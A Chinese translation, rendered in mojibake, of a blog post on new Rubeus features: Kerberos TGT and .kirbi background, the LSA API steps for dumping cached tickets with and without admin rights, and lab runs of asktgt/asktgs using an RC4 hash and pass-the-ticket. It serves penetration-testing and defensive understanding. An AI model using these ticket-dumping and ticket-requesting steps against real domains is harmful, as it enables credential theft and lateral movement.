# Rubeus - çŽ°åœ¨æ‹¥æœ‰æ›´å¤šçš„KekeoåŠŸèƒ½
|
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œæ–‡ç« åŽŸä½œè€… harmj0yï¼Œæ–‡ç« æ¥æºï¼šharmj0y.net
åŽŸæ–‡åœ°å€ï¼š
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
è¯‘è€…æ‘˜è¦ï¼š æœ¬æ–‡æ˜¯[ä»Ž Kekeo åˆ° Rubeus](https://www.anquanke.com/post/id/161781)
çš„åŽç»­ï¼Œä½œè€…ç»§ç»­æ›´æ–°äº† Rubeus é¡¹ç›®ï¼Œå®žçŽ°äº†æ›´å¤šçš„ Kekeo åŠŸèƒ½ã€‚ä¸»è¦ä»‹ç»äº†è™šå‡ä»£ç† TGT å’Œ åŸºäºŽ Kerberos
çš„å£ä»¤æ›´æ”¹ç­‰æ–°åŠŸèƒ½åŠå…¶åŽŸç†ã€‚
[Rubeus](https://github.com/GhostPack/Rubeus), æ˜¯æˆ‘å°† @gentilkiwi å†™çš„
[Kekeo](https://github.com/gentilkiwi/kekeo/) å·¥å…·é›†çš„éƒ¨åˆ†åŠŸèƒ½ç”¨ C#
é‡æ–°å®žçŽ°çš„ä¸€ä¸ªé¡¹ç›®ã€‚ç›®å‰å·²ç»å‘å¸ƒäº†æ›´æ–°çš„ 1.1.0 ç‰ˆæœ¬ï¼Œå¹¶åœ¨åœ¨ 1.2.0
ç‰ˆæœ¬ä¸­å®žçŽ°äº†æ–°çš„åŠŸèƒ½ã€‚æ­¤ç¯‡æ–‡ç« å°†ä¼šä»‹ç»ä¸»è¦çš„æ–°åŠŸèƒ½å’Œå…¶ä»–çš„ä¸€äº›ä¿®æ”¹ï¼Œå¹¶å°†æ·±å…¥æŽ¢è®¨æœ€é…·çš„æ–°åŠŸèƒ½ â€“ è™šå‡ä»£ç†TGTå’ŒåŸºäºŽKerberosçš„å£ä»¤æ›´æ”¹ã€‚
åƒä»¥å‰ä¸€æ ·ï¼Œæˆ‘æƒ³å¼ºè°ƒ @gentilkiwi æ‰æ˜¯è¿™äº›æŠ€æœ¯çš„åŽŸåˆ›è€…ï¼Œæ­¤é¡¹ç›®åªæ˜¯ä»–çš„å·¥ä½œçš„ä¸€ä¸ªé‡æ–°å®žçŽ°ã€‚è¦ä¸æ˜¯æœ‰
[Kekeo](https://github.com/gentilkiwi/kekeo/)
ï¼Œæˆ‘æ˜¯æ°¸è¿œä¹Ÿæƒ³ä¸å‡ºè¿™äº›æ”»å‡»æŠ€æœ¯çš„ã€‚æˆ‘å‘çŽ°é™¤éžæˆ‘äº²è‡ªåŽ»å®žçŽ°ï¼Œå¦åˆ™æˆ‘æ— æ³•çœŸæ­£ç†è§£æŸä¸ªåŽŸç†ï¼Œå› æ­¤æˆ‘å°†ç»§ç»­é‡æ–°å®žçŽ° Kekeo çš„åŠŸèƒ½ã€‚æˆ‘å°†å°½é‡åŽ»è§£é‡Šæ¸…æ¥š
tgt::deleg/tgtdeleg å’Œ misc::changepw/changepw å‡½æ•°ï¼ˆKekeo å’Œ Rubeus
éƒ½æœ‰ä½¿ç”¨ï¼‰çš„åº•å±‚åŽŸç†ï¼Œè¿™æ ·å¤§å®¶éƒ½èƒ½å¯¹ Benjamin å®žçŽ°çš„å†…å®¹æœ‰æ‰€äº†è§£ã€‚
ä½†æ˜¯é¦–å…ˆï¼Œä¸ºäº†ä¾¿äºŽè®²è§£æˆ‘å°†å…ˆä»‹ç»ä¸€äº›èƒŒæ™¯çŸ¥è¯†ã€‚
## ä»Ž TGT åˆ° .kirbis
æ­£å¦‚æˆ‘ä»¬ä¼ ç»Ÿä¸Šæ‰€ç†è§£çš„é‚£æ ·ï¼Œåœ¨ Kerberos äº¤æ¢ä¸­ä½¿ç”¨ä¸€ä¸ª hash ï¼ˆntlm/rc4_hmac, aes128_cts_hmac,
aes256_cts_hmac. .ç­‰ï¼‰ä»ŽåŸŸæŽ§ï¼ˆä¹Ÿç§°ä¸ºKDCï¼Œå³å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼‰èŽ·å–ç¥¨è¯æŽˆäºˆç¥¨è¯ï¼ˆTGTï¼‰ã€‚åœ¨ Kerberos è¯­è¨€ä¸­ï¼Œè¿™ä¸ªäº¤æ¢è¿‡ç¨‹æ¶‰åŠåˆ°å‘
KDC/DC å‘é€ AS-REQï¼ˆèº«ä»½è®¤è¯æœåŠ¡è¯·æ±‚ï¼‰è¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¦‚æžœæˆåŠŸåˆ™å°†ä¼šç”Ÿæˆä¸€ä¸ª AS-REP
ï¼ˆèº«ä»½è®¤è¯æœåŠ¡å›žå¤ï¼‰ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªTGTã€‚ä½†å…¶å®žå®ƒè¿˜åŒ…å«ç€å…¶ä»–å†…å®¹ã€‚
Big noteï¼š TGT æœ¬èº«æ˜¯æ²¡ç”¨çš„ã€‚TGT æ˜¯ç”¨ Kerberos æœåŠ¡ï¼ˆkrbtgtï¼‰å“ˆå¸ŒåŠ å¯†/ç­¾åçš„ä¸é€æ˜Ž blob
æ•°æ®ï¼Œæ‰€ä»¥æ™®é€šç”¨æˆ·æ— æ³•å°†å…¶è§£ç ã€‚é‚£ä¹ˆï¼ŒTGT å®žé™…ä¸Šæ˜¯å¦‚ä½•ä½¿ç”¨çš„å‘¢ï¼Ÿ
åœ¨æˆåŠŸè®¤è¯ç”¨æˆ·åŽè¿”å›žçš„ AS-REQ ä¸­ï¼ŒTGTä¸æ˜¯å”¯ä¸€çš„æ•°æ®å—ï¼Œè¿˜æœ‰ä¸€ä¸ªâ€åŠ å¯†çš„éƒ¨åˆ†â€ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¢«æ ‡è®°çš„ [EncKDCRepPart
ç»“æž„](https://github.com/gentilkiwi/kekeo/blob/fd852374dfcfae4ddf5e19e4d8eeb03833f08963/modules/asn1/KerberosV5Spec2.asn#L209-L227)
ï¼Œä½¿ç”¨ç”¨æˆ·çš„ hash è¿›è¡ŒåŠ å¯†ã€‚ä½¿ç”¨çš„å“ˆå¸Œæ ¼å¼ï¼ˆrc4_hmac, aes256_cts_hmac_sha1, ç­‰ï¼‰ä¼šåœ¨åˆå§‹äº¤æ¢è¿‡ç¨‹ä¸­è¿›è¡Œåå•†ã€‚å½“è¿™ä¸ª
blob è¢«è§£å¯†æ—¶ï¼Œå®ƒä¼šåŒ…å«ä¸€ç»„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬å¯åŠ¨æ—¶é—´ï¼Œç»“æŸæ—¶é—´ï¼Œç¥¨æ®çš„æ›´æ–°æœŸé™ç­‰ï¼Œä½†æœ€é‡è¦çš„æ˜¯å®ƒè¿˜ä¼šåŒ…å«ä¸€ä¸ªä¼šè¯å¯†é’¥ï¼Œè¯¥å¯†é’¥åŒæ—¶å­˜åœ¨äºŽä¸é€æ˜Žçš„ TGT
blob ä¸­ï¼ˆä¹Ÿæ˜¯è¢«ç”¨æˆ·çš„ krbtgt hash è¿›è¡ŒåŠ å¯†çš„ï¼‰ã€‚
é‚£ä¹ˆç”¨æˆ·/ä¸»æœºæ˜¯å¦‚ä½•â€œä½¿ç”¨â€TGTçš„å‘¢ï¼Ÿå®ƒä¼šæä¾› TGT å’Œä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†çš„è®¤è¯å™¨ â€”â€”
è¿™å°±è¯æ˜Žå®¢æˆ·ç«¯æ˜¯çŸ¥é“åœ¨åˆå§‹è®¤è¯äº¤æ¢è¿‡ç¨‹ä¸­æ‰€è¿”å›žçš„ä¼šè¯å¯†é’¥çš„ï¼ˆå› æ­¤ä¹Ÿä¼šåŒ…å«åœ¨ TGT ä¸­ï¼‰ã€‚TGT ç»­è®¢ï¼ŒæœåŠ¡ç¥¨æ®è¯·æ±‚å’Œ S4U è¯·æ±‚éƒ½ä¼šéœ€è¦è¿™ä¸ªä¼šè¯å¯†é’¥ã€‚
é‚£ä¹ˆè¿™å°±è¯´å¾—é€šäº†;)
æ‰€æœ‰è¿™äº›æ•°æ®éƒ½ä¼šåŒ…å«åœ¨ä¸€ä¸ª KRB-CRED ç»“æž„ä¸­ã€‚è¿™å°±æ˜¯ Mimikatz è¯­è¨€ä¸­çš„ .kirbi æ–‡ä»¶ï¼Œä»£è¡¨é€šè¿‡å·²å»ºç«‹çš„ LSA API æäº¤çš„å®Œæ•´çš„
Kerberos å‡­è¯çš„ç¼–ç ç»“æž„ã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬è°ˆè®º â€œTGTâ€ æ—¶ï¼Œæˆ‘ä»¬å®žé™…ä¸ŠæŒ‡çš„æ˜¯å¯ç”¨çš„ TGT .kirbi
æ–‡ä»¶ï¼ˆå…¶ä¸­åŒ…å«æœ‰æ˜Žæ–‡çš„ä¼šè¯å¯†é’¥ï¼‰ï¼Œè€Œä¸ä»…ä»…æ˜¯ TGT blobã€‚æˆ‘ä»¬å°†æ›´æ·±å…¥çš„ä»‹ç»ä¸€ä¸‹è¿™ä¸ªé‡è¦åŒºåˆ«ã€‚
æ­¤å¤–ï¼Œæˆ‘è¿˜æƒ³å¿«é€Ÿåœ°ä»‹ç»ä¸€ä¸‹ä»Žç®¡ç†å‘˜æƒé™å’Œéžç®¡ç†å‘˜æƒé™çš„æ¡ä»¶ä¸‹æå– Kerberos ç¥¨æ®çš„å·®å¼‚ã€‚Rubeus çš„ dump å‘½ä»¤å°†æ ¹æ® Rubeus
è¿è¡Œæ—¶æ‰€å¤„çš„å®Œæ•´æ€§çº§åˆ«æ¥è‡ªåŠ¨é‡‡å–åˆé€‚çš„æ–¹æ³•ã€‚
å¦‚æžœæ˜¯ç®¡ç†å‘˜æƒé™ï¼Œåˆ™ä¸€èˆ¬çš„æ‰§è¡Œæ–¹æ³•æ˜¯ï¼š
  1. æå–è‡³ç³»ç»Ÿæƒé™ã€‚
  2. ä½¿ç”¨ [LsaRegisterLogonProcess()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsaregisterlogonprocess) ï¼ˆéœ€è¦SYSTEMæƒé™ï¼‰æ³¨å†Œä¸€ä¸ªè™šå‡çš„ç™»å½•è¿›ç¨‹ã€‚è¿™å°†å‘ LSA æœåŠ¡å™¨è¿”å›žä¸€ä¸ªç‰¹æƒå¥æŸ„ã€‚
  3. ä½¿ç”¨ [LsaEnumerateLogonSessions()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions) æžšä¸¾å½“å‰ç™»é™†ä¼šè¯ã€‚
  4. å¯¹äºŽæ¯ä¸ªç™»å½•ä¼šè¯ï¼Œæž„å»ºä¸€ä¸ª [KERB_QUERY_TKT_CACHE_REQUEST](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request) ç»“æž„ï¼Œç”¨æ¥è¡¨ç¤ºæ­¤ç™»å½•ä¼šè¯çš„ logon session ID ï¼Œå’Œä¸€ä¸ª [KerbQueryTicketCacheMessage](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ne-ntsecapi-_kerb_protocol_message_type) ç±»åž‹çš„æ¶ˆæ¯ç±»åž‹ã€‚è¿™å°†è¿”å›žæŒ‡å®šç”¨æˆ·çš„ç™»å½•ä¼šè¯ä¸­æ‰€ç¼“å­˜çš„æ‰€æœ‰ Kerberos ç¥¨æ®çš„ç›¸å…³ä¿¡æ¯ã€‚
  5. ä½¿ç”¨ KERB_QUERY_TKT_CACHE_REQUEST è°ƒç”¨ [LsaCallAuthenticationPackage()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) ï¼Œå¹¶è§£æžè¿”å›žçš„ç¥¨æ®ç¼“å­˜ä¿¡æ¯ã€‚
  6. å¯¹äºŽç¼“å­˜ä¸­çš„æ¯ä¸ªç¥¨æ®ä¿¡æ¯ä½ï¼Œæž„å»ºä¸€ä¸ª [KERB_RETRIEVE_TKT_REQUEST](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request) ç»“æž„ï¼Œæ­¤ç»“æž„åŒ…å«çš„å†…å®¹ä¸ºï¼š[KerbRetrieveEncodedTicketMessage](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ne-ntsecapi-_kerb_protocol_message_type) çš„æ¶ˆæ¯ç±»åž‹ï¼Œå½“å‰æ­£åœ¨è¿­ä»£çš„ç™»å½•ä¼šè¯IDï¼Œä»¥åŠå½“å‰æ­£åœ¨è¿­ä»£çš„ç¼“å­˜ä¸­çš„ç¥¨æ®æ‰€åŒ…å«çš„ç›®æ ‡æœåŠ¡å™¨ï¼ˆå³SPNï¼‰ã€‚è¿™è¡¨æ˜Žæˆ‘ä»¬éœ€è¦ç¼“å­˜ä¸­æŒ‡å®šçš„æœåŠ¡ç¥¨æ®çš„ç¼–ç  KRB-CRED (.kirbi) blob æ•°æ®ã€‚PS â€“ [ç”¨C#å®žçŽ°è¿™ä¸ªçš„è¿‡ç¨‹æ¯”è¾ƒä»¤äººè®¨åŽŒ ðŸ˜‰](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/LSA.cs#L506-L524)
  7. ä½¿ç”¨ KERB_RETRIEVE_TKT_REQUEST è°ƒç”¨ [LsaCallAuthenticationPackage()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) å¹¶è§£æžè¿”å›žçš„ .kirbi ç¥¨æ®ä¿¡æ¯ã€‚
ä»¥ä¸Šæ“ä½œå°†è¿”å›žå½“å‰ç³»ç»Ÿä¸Šçš„ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·çš„æ‰€æœ‰ TGT å’Œ æœåŠ¡ç¥¨æ®çš„å®Œæ•´ .kirbi blob æ•°æ®ï¼Œæ— æ— é¡»æ‰“å¼€ LSASS
çš„è¯»å–å¥æŸ„ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ Mimikatz çš„ sekurlsa::tickets /export å‘½ä»¤ç›´æŽ¥ä»Ž LSASS è¿›ç¨‹çš„å†…å­˜ä¸­å¯¼å‡ºæ‰€æœ‰çš„
Kerberos ç¥¨æ®ï¼Œä½†æ˜¯è®°ä½ï¼Œé‚£ä¸æ˜¯å”¯ä¸€çš„æ–¹æ³•ï¼šï¼‰
å¦‚æžœä½ å¤„äºŽéžç®¡ç†å‘˜æƒé™ï¼Œ[åˆ™ä¸Žä¸Šè¿°çš„æ–¹æ³•ç•¥æœ‰ä¸åŒ](https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/LSA.cs#L685-L935):
  1. ä½¿ç”¨ [LsaConnectUntrusted()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsaconnectuntrusted) æ‰“å¼€ä¸€ä¸ªä¸Ž LSA çš„ä¸å¯ä¿¡è¿žæŽ¥ï¼›
  2. ä½¿ç”¨ [KerbQueryTicketCacheMessage](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ne-ntsecapi-_kerb_protocol_message_type) æ¶ˆæ¯ç±»åž‹æž„å»ºä¸€ä¸ª [KERB_QUERY_TKT_CACHE_REQUEST](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)ï¼Œå°†è¿”å›žå½“å‰ç”¨æˆ·çš„ç™»å½•ä¼šè¯ä¸­ç¼“å­˜çš„æ‰€æœ‰ Kerberos ç¥¨æ®ä¿¡æ¯ï¼›
  3. ä½¿ç”¨ KERB_QUERY_TKT_CACHE_REQUEST è°ƒç”¨ [LsaCallAuthenticationPackage()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage)ï¼Œå¹¶è§£æžè¿”å›žçš„ç¼“å­˜ç¥¨æ®ä¿¡æ¯ï¼›
  4. å¯¹äºŽç¼“å­˜ä¸­çš„æ¯ä¸ªç¥¨æ®ä¿¡æ¯ä½ï¼Œæž„å»ºä¸€ä¸ªæ¶ˆæ¯ç±»åž‹ä¸º [KerbRetrieveEncodedTicketMessage](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ne-ntsecapi-_kerb_protocol_message_type) çš„ [KERB_RETRIEVE_TKT_REQUEST](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_retrieve_tkt_request) ç»“æž„ï¼Œå’Œç¼“å­˜ä¸­æˆ‘ä»¬æ­£åœ¨è¿­ä»£çš„ç¥¨æ®çš„ç›®æ ‡æœåŠ¡å™¨ï¼ˆå³SPNï¼‰ã€‚è¿™è¡¨æ˜Žæˆ‘ä»¬éœ€è¦ç¼“å­˜ä¸­æŒ‡å®šçš„æœåŠ¡ç¥¨æ®çš„ç¼–ç  KRB-CRED (.kirbi) blob æ•°æ®ï¼›
  5. ä½¿ç”¨ KERB_RETRIEVE_TKT_REQUEST è°ƒç”¨ [LsaCallAuthenticationPackage()](https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) å¹¶è§£æžè¿”å›žçš„ .kirbi ç¥¨æ®ä¿¡æ¯ã€‚
å¦‚æžœä¸æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œé€»è¾‘ä¸Šåªèƒ½è¯·æ±‚å½“å‰ç™»å½•ä¼šè¯çš„ç¥¨æ®ã€‚å¹¶ä¸”ï¼Œåœ¨ win7 ä»¥ä¸Šç³»ç»Ÿï¼ŒWindows é™åˆ¶äº†ä»Žç”¨æˆ·ç©ºé—´å¯¹ TGT ä¼šè¯å¯†é’¥çš„æå–ï¼Œæ‰€ä»¥å½“è½¬å‚¨
TGT æ—¶ï¼Œä½ ä¼šå¾—åˆ°å¦‚ä¸‹ç»“æžœï¼š
è¿™è¯´æ˜Žå¦‚æžœæ²¡æœ‰ç®¡ç†å‘˜æƒé™ï¼Œåˆ™æ— æ³•ä¸ºå½“å‰ç”¨æˆ·æå–åˆ°å¯ç”¨ TGT .kirbisï¼Œè¯·æ±‚åˆ°çš„ä¼šè¯å¯†é’¥ä¸ºç©ºã€‚å›¾ä¸­ Mimikatz çš„è¾“å‡ºæ˜¾ç¤ºï¼Œ
[Microsoft ä½¿ç”¨ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹(allowtgtsessionkey)](https://support.microsoft.com/en-us/help/308339/registry-key-to-allow-session-keys-to-be-sent-in-kerberos-ticket-grant) æ¥å…è®¸è¿”å›ž TGT ä¼šè¯å¯†é’¥ã€‚ä½†æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨æ­¤é”®å€¼ï¼Œå¹¶ä¸”éœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½ä¿®æ”¹ã€‚
ä¸‹æ–‡ä¸­çš„ tgtdeleg ç« èŠ‚å°†è§£é‡Š Benjamin ç»•è¿‡æ­¤é™åˆ¶çš„æŠ€å·§ã€‚
è¿”å›žä¼šè¯å¯†é’¥æ˜¯ä¸ºäº†åˆ¶ä½œæœåŠ¡ç¥¨æ®ã€‚åŽé¢æˆ‘ä»¬å°†çœ‹åˆ°å…¶é‡è¦æ€§ã€‚
## asktgs
ç¬¬ä¸€ä¸ªâ€œé‡å¤§çš„â€æ–°åŠŸèƒ½æ˜¯é€šç”¨æœåŠ¡ç¥¨æ®è¯·æ±‚ï¼š
    Rubeus.exe asktgs   [/dc:DOMAIN_CONTROLLER] [/ptt]
asktgs åŠŸèƒ½å’Œ asktgt åŠŸèƒ½ä¸€æ ·ï¼ŒæŽ¥å— /dc:X /ptt å‚æ•°ã€‚/ticket:X å‚æ•°ä¸€æ ·æ˜¯æŽ¥å— .kirbi æ–‡ä»¶çš„ base64
ç¼–ç æˆ– .kirbi æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„è·¯å¾„ã€‚è¿™ç¥¨æ®æ˜¯ä¸€ä¸ªä»¥ .kirbi æ–‡ä»¶æ ¼å¼è¡¨ç¤ºçš„ TGT ï¼ˆå¦‚å‰æ‰€è¿°ï¼Œå®Œæ•´çš„ä¼šè¯å¯†é’¥ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ª TGS-REQ/TGS-REP äº¤æ¢ä¸­æ­£ç¡®çš„è¯·æ±‚ä¸€ä¸ªæœåŠ¡ç¥¨æ®ã€‚
/service:SPN å‚æ•°æ˜¯å¿…é¡»çš„ï¼Œç”¨äºŽæŒ‡å®šè¦è¯·æ±‚çš„æœåŠ¡ç¥¨æ®çš„æœåŠ¡ä¸»ä½“åç§°ï¼ˆSPNï¼‰ã€‚è¿™ä¸ªå‚æ•°æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªä»¥é€—å·åˆ†éš”çš„ SPN ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š
    C:Temptickets>Rubeus.exe asktgt /user:harmj0y /rc4:2b576acbe6bcfda7294d6bd18041b8fe
       ______        _
      (_____       | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ | ___ | | | |/___)
      | |   | |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/
      v1.0.0
    [*] Action: Ask TGT
    [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/ preauth) for: 'testlab.localharmj0y'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 232 bytes
    [*] Received 1405 bytes
    [+] TGT request successful!
    [*] base64(ticket.kirbi):
          doIFFjCCBRKgAwIBBa...(snip)...
    C:Temptickets>Rubeus.exe asktgs /ticket:doIFFjCCBRKgAwIBBa...(snip...)== /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt
       ______        _
      (_____       | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ | ___ | | | |/___)
      | |   | |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/
      v1.0.0
    [*] Action: Ask TGS
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
    [*] Building TGS-REQ request for: 'LDAP/primary.testlab.local'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 1384 bytes
    [*] Received 1430 bytes
    [+] TGS request successful!
    [*] base64(ticket.kirbi):
          doIFSjCCBUagAwIBBaEDA...(snip)...
    [*] Action: Import Ticket
    [+] Ticket successfully imported!
    [*] Action: Ask TGS
    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)